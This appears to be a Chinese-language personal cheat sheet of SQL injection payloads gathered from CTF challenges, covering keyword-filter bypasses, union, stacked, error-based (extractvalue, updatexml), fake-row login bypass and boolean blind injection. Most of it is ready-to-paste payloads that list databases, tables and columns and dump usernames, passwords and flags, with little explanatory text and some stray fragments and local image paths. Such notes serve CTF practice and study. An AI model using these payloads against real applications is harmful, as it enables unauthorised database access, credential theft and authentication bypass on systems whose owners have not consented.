SQL注注注注

[TOC]

###### 一些bypass

[SQL注入针对关键字过滤的绕过技巧 - zu1k](https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/)

```

空格绕过：%20 %09 %0a %0b %0c %0d %a0 %00 /**/    ()
#,--+绕过：
常见的sql查询语句:
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
我指的单引号就是$id'的这个单引号，一般我们会用#注释掉，现在没法注释掉后，应该怎么办呢？

当有一个'时，这一个'会落单报错，但是当有一个和他一起闭合时就不报错了
只要'能匹配，多少个'都没有事。  
select ''   这样虽然查询为空，但是是不报错的。

我们输入  ?id=1''   ，会发现不报错了已经，但是我们尝试?id=1' or 1=1'  
发现出错了。是因为只能直接用在select中，注意是直接。
?id=1''    查询语句变为select * from user where id='1''' LIMIT0,1     可以
?id=1' and 1=1' 查询:SELECT * FROM users WHERE id='1' or 1=1'' LIMIT 0,1   不可以
id=-1'  union select 1,2,3'   可以
所以说是直接在select中   

select被过滤：
/*!%53eLEct*/          sel<>ect

or被过滤：
group by

-1'/**/group/**/by/**/25,'2
'2是为了闭合掉后面的那个引号。

```

1.打开每一个网页都遛了一遍，没发现什么，但是在f12的网络里找到了端倪，明显是个注入点

![img](https://img-blog.csdnimg.cn/23f3168665e74dbdba7f0c1672dd50b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAODd4MDA=,size_20,color_FFFFFF,t_70,g_se,x_16)

 

2.访问页面后开始注入（注意要把#的地方换成[backend](https://so.csdn.net/so/search?q=backend&spm=1001.2101.3001.7020)查看后台数据，不然可能看不到回显）

数字型

1 and 1=2 union select 1,database(),3,4,5,6,7

先测试[回显](https://so.csdn.net/so/search?q=回显&spm=1001.2101.3001.7020)位置

-1' or 1=1--+

1'or'1

```sql
id=1 order by 1



id=1 order by 2



id=1 order by 3//开始没有回显
```

![img](https://img-blog.csdnimg.cn/cadce15468ce4da79fcaf1e4f3cdb634.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAODd4MDA=,size_20,color_FFFFFF,t_70,g_se,x_16)

?id=1 and 1=2 union select 1,2

然后开始注入

```sql
?id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#

(select group_concat(table_name) from information_schema.tables where table_schema='web2')


group_concat(schema_name) from information_schema.schemata#
爆全部的库

query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()#


//查看表名



?id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name='admin'#

(select group_concat(column_name) from information_schema.columns where table_name= 'flag' and table_schema='web2' )

?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name='content'#


//查看列名



?id=0 union select group_concat(username),group_concat(password) from admin#

(select flag from flag limit 0,1)

?query=-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content#


//查看字段，得到admin和password
```

![img](https://img-blog.csdnimg.cn/bc7c9db2df4f4fe49b86c081b1bc27af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAODd4MDA=,size_20,color_FFFFFF,t_70,g_se,x_16)

 !!!!!!!!@@@@@@@@@

没有''查表。采用字符串转16进制来解决

group_concat(admin_name,0x3a,pwd)%20from%20blue_admin



3.用刚才拿到的username和passwd回到一开始的登陆页面输入再登陆，flag就出来啦。

![img](https://img-blog.csdnimg.cn/5dbb9061e0db438093d8941e2de67df5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAODd4MDA=,size_20,color_FFFFFF,t_70,g_se,x_16)

 

没有什么过滤和其他难点，主要是要找到注入点和看回显的位置

![1694227909339](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1694227909339.png)



## SQL注入的一些语句

###### 堆叠注入

[强网杯 2019\]随便注 【SQL注入】四种解法_[强网杯 2019]随便注-CSDN博客](https://blog.csdn.net/weixin_38832257/article/details/126395256?ops_request_misc=&request_id=&biz_id=102&utm_term=[强网杯 2019]随便注&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-126395256.142^v99^pc_search_result_base1&spm=1018.2226.3001.4187)

```
1’;show databases;#

1';show+tables;#`获取到所有的表

1’;show columns from FlagHere;#
或 1’;show columns from `FlagHere`;#
注
方式一：1'; show columns from tableName;#
方式二：1';desc tableName;#
#注意，如果tableName是纯数字，需要用`包裹，比如
1';desc `1919810931114514`;#


//获取数据
1';
handler FlagHere open;
handler FlagHere read first;
handler FlagHere close;
同理，如果表是数字的话要加``
当select被过滤
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE  hacker;#


设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）
利用PIPES_AS_CONCAT令||起到连接符的作用
1;set sql_mode=PIPES_AS_CONCAT;select 1


```

堆叠注入：[SUCTF 2019\]EasySQL-CSDN博客](https://blog.csdn.net/gsumall04/article/details/133281048?ops_request_misc=%7B%22request%5Fid%22%3A%22170904326516800227490232%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170904326516800227490232&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-133281048-null-null.142^v99^pc_search_result_base1&utm_term=[SUCTF 2019]EasySQL&spm=1018.2226.3001.4187)

一些Payload

```
nss=2'/**/ununionion/**/select/**/1,2,(select/**/database())%23
nss=2'/**/ununionion/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database())%23
nss=2'/**/ununionion/**/select/**/1,2,(select/**/group_concat(Secr3t)/**/from/**/NSS_db.NSS_tb)%23
```



```
-1'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23
```

```
-a'/**/union/**/select/**/(select/**/database())'

-a'/**/union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='test')'

-a'/**/union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag')'

-a'/**/union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)'
```

当2是回显时，

no=2 union/**/select 1,group_concat(username,passwd,data),3,4 from users where no=1#



过滤 or,用----------')'

过滤from,双写frroom

grrooup_concat(table_name) frroom infoorrmation_schema.tables where table_schema=database()#



如果是字符型的话

```
测试长度
?wllm=1’order//by//3%23 – 正常
?wllm=1’order//by//4%23 – 错误
– 测试长度为3

测试回显
?wllm=-1’union//select//1,2,3%23 # 2,3回显位置
```

注意，#用%23代替

当查flag不完整的话可以用一下函数：

substr，right，REVERSE，mid

###### 双写：

infoorrmation

###### extractvalue&&&&&updatexml

这里使用extractvalue和updatexml进行[报错注入](https://so.csdn.net/so/search?q=报错注入&spm=1001.2101.3001.7020)，空格和=号没有，所以我们要使用（）来代替空格，使用like来代替=号

使用extractvalue（）

```
//暴库
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(database()))))%23
//爆表
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))%23
//爆段落
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23
//爆数据
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23
//补充
flag出来了，不对好像只有一半，使用{left(),right()}
/check.php?username=admin&password=admin%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23

/check.php?username=admin&password=admin%27^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23


```

使用updatexml()

```
//查看数据库
1'or(updatexml(0,concat(0x5e,database()),0))#
//报表
1'or(updatexml(0,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),0))#
//爆字段
1'or(updatexml(0,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),0))#
//爆数据
1'or(updatexml(0,concat(0x5e,(select(group_concat(password))from(H4rDsq1))),0))#
//补充
 因为报错只能回显32位字符串，这里只回显了一部分的flag，接着用截断函数right查看身下的部分 

1'or(updatexml(0,concat(0x5e,right((select(group_concat(password))from(H4rDsq1)),31)),0))#


```

报错注入下，column等被ban:http://www.wupco.cn/?p=4117

```
tt=1'||extractvalue(0,concat(0x7e,(select * from (select * from output a join output b)  c)))%23

//output是表名。

//当flag不全时，也可以用Mid
tt=1'||extractvalue(0,concat(0x7e,mid((select data from output),20,60)))%23
```

[SQL注入-报错注入_extractvalue operand should contain 1 column(s)-CSDN博客](https://blog.csdn.net/qq_43691308/article/details/105499940?ops_request_misc=&request_id=&biz_id=102&utm_term=Subquery returns more than 1 r&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-105499940.142^v99^pc_search_result_base1&spm=1018.2226.3001.4187)

###### mysql在查询不存在的数据时会自动构建虚拟数据，一般数据要么明文，要么MD5

[BUUCTF--[GXYCTF2019\]BabySQli详解-CSDN博客](https://blog.csdn.net/x1520700/article/details/124921221?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-124921221-blog-122885889.235^v38^pc_relevant_sort_base1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-124921221-blog-122885889.235^v38^pc_relevant_sort_base1&utm_relevant_index=5)

payload:

​            name=1'+union+select+1,'admin','202cb962ac59075b964b07152d234b70'#&pw=123

查询1，但是没有1，于是就虚拟的创建了一个id=1,username=admin,pwd=202cb962ac59075b964b07152d234b70的一个表，接着查询就ok了。

###### 无列名注入

[[SWPU2019\] Web1 - 简书 (jianshu.com)](https://www.jianshu.com/p/a352261e0ad5)

[[SWPU2019\]Web1 - AikNr - 博客园 (cnblogs.com)](https://www.cnblogs.com/AikN/p/15725756.html)

![1707891806403](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1707891806403.png)

![1707891829750](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1707891829750.png)

###### 布尔盲注合集

```
1，
//爆库
0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),0,1))<199)
//爆表
1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{0},1))={1})^1".format(num,ord(i))
//爆列名
1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flaaaaag')),{0},1))={1})^1".format(num,ord(i))    #爆列名
//爆内容
		payload='1^(ascii(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),{0},1))={1})^1'.format(num,ord(i))
        payload='1^(ascii(substr(reverse((select(group_concat(password))from(F1naI1y))),{0},1))={1})^1'.format(num,ord(i))                           #爆字段


```

### regexp注入

[[NCTF2019\]SQLi --BUUCTF --详解_buuctf [nctf2019]sqli-CSDN博客](https://blog.csdn.net/l2872253606/article/details/125265138?ops_request_misc=%7B%22request%5Fid%22%3A%22171223669616800180698318%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=171223669616800180698318&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125265138-null-null.142^v100^pc_search_result_base1&utm_term=[NCTF2019]SQLi&spm=1018.2226.3001.4187)